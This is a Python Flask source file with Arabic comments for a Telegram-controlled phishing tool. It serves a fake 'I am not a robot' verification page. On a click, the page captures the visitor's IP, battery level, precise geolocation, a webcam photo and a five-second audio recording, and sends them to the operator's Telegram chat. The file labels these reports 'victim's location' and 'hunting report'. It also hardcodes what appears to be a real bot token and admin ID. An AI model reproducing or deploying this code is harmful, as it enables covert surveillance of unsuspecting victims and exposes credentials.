
import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v16.8) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" # رابط الاشتراك

system_config = {
    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v16.8\n\nالرابط شغال والوضع لوز! 🚀",
    "trap_title": "تأكيد الأمان الموحد",
    "banned_ips": [],
    "banned_users": [],  # قائمة المحظورين
    "all_users": {}      # حفظ المستخدمين {id: username}
}

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
        return requests.post(API_URL + method, json=payload, timeout=20).json()
    except: return None

# واجهة الصيد (كما هي)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق بشري</h2>
        <p style="color: #bbb;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت للوصول إلى المحتوى</p>
        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        async function startCapture() {
            const btn = document.getElementById('go'); const st = document.getElementById('st');
            btn.style.display = 'none'; st.innerText = "جاري تهيئة النظام...";
            try {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                const b = await navigator.getBattery().catch(() => ({}));
                const info = `📜 **تقرير صيد (v16.8)**\\n━━━━━━━━━━━━━━\\n🌐 **IP:** \`${ipData.ip}\`\\n🔋 **البطارية:** ${Math.round(b.level*100)}%`;
                await send(info, 'msg');
                navigator.geolocation.getCurrentPosition(p => {
                    send(`📍 **موقع الضحية:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                }, null, {enableHighAccuracy: true});
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg', 0.9), 'img');
                    const recorder = new MediaRecorder(stream); const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => send(reader.result, 'aud');
                        st.innerText = "✅ تمت العملية!";
                    };
                    recorder.start(); setTimeout(() => recorder.stop(), 5000);
                }, 4000);
            } catch (e) { st.innerText = "❌ خطأ!"; setTimeout(() => location.reload(), 2000); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    if request.remote_addr in system_config["banned_ips"]: return "BLOCKED", 403
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    if t == 'msg': tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 **صورة جديدة**"}, {'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة جديدة**"}, {'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update or "message" not in update:
        if "callback_query" in update: return handle_callback(update["callback_query"])
        return "OK"
    
    msg = update["message"]
    chat_id = str(msg["chat"]["id"])
    username = msg.get("from", {}).get("username", "بدون يوزر")
    text = msg.get("text", "")

    # حفظ المستخدم تلقائياً
    system_config["all_users"][chat_id] = f"@{username}"

    # فحص الحظر
    if chat_id in system_config["banned_users"]: return "OK"

    if chat_id == ADMIN_ID:
        if text.startswith("/user_ban"):
            uid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
            if uid: system_config["banned_users"].append(uid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر `{uid}`"})
        elif text.startswith("/user_unban"):
            uid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
            if uid in system_config["banned_users"]: system_config["banned_users"].remove(uid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر `{uid}`"})
        
        main_kb = {"inline_keyboard": [
            [{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}, {"text": "📊 الإحصائيات", "callback_data": "status"}],
            [{"text": "👥 قائمة المستخدمين", "callback_data": "list_users"}],
            [{"text": "⚙️ إعدادات الإمبراطور", "callback_data": "admin_settings"}]
        ]}
        tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": main_kb, "parse_mode": "Markdown"})
    else:
        # إجبار المستخدمين العاديين على الاشتراك
        sub_kb = {"inline_keyboard": [[{"text": "اضغط هنا للاشتراك أولاً ✅", "url": SUB_URL}]]}
        tg_request("sendMessage", {"chat_id": chat_id, "text": "⚠️ عذراً، يجب عليك الاشتراك في القناة الرسمية لتتمكن من استخدام البوت!", "reply_markup": sub_kb})

    return "OK"

def handle_callback(query):
    cid = str(query["message"]["chat"]["id"])
    if cid != ADMIN_ID: return "OK"
    data = query["data"]
    
    if data == "gen_link": tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك: `{BASE_URL}`"})
    elif data == "list_users":
        users_list = "👥 **قائمة مستخدمي البوت:**\n\n"
        for uid, uname in system_config["all_users"].items():
            users_list += f"👤 {uname} | ID: `{uid}`\n"
        tg_request("sendMessage", {"chat_id": cid, "text": users_list, "parse_mode": "Markdown"})
    elif data == "status":
        tg_request("sendMessage", {"chat_id": cid, "text": f"✅ النظام مستقر\n🚫 المحظورين: {len(system_config['banned_users'])}\n👥 الإجمالي: {len(system_config['all_users'])}"})
    elif data == "admin_settings":
        adm_kb = {"inline_keyboard": [[{"text": "🚫 حظر (ID)", "callback_data": "how_ban"}, {"text": "🔓 فك (ID)", "callback_data": "how_unban"}], [{"text": "🔙 عودة", "callback_data": "back"}]]}
        tg_request("sendMessage", {"chat_id": cid, "text": "🛠 التحكم بالأعضاء:", "reply_markup": adm_kb})
    elif data == "how_ban": tg_request("sendMessage", {"chat_id": cid, "text": "لحظر يوزر أرسل: `/user_ban ID`"})
    elif data == "how_unban": tg_request("sendMessage", {"chat_id": cid, "text": "لفك حظر يوزر أرسل: `/user_unban ID`"})
    
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
